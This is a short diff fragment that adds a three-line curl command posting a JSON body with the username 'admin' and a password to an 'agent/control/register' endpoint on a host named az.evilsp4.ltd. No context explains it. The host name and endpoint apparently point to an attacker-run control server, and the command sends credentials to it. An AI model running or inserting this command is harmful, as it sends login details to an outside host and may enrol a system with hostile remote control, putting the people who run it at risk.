@@ -1,0 +1,3 @@
+curl -i -X POST http://az.evilsp4.ltd:6062/v1/agent/control/register \
+  -H "Content-Type: application/json" \
+  -d '{"name":"Education","user":"admin","pass":"114514"}'
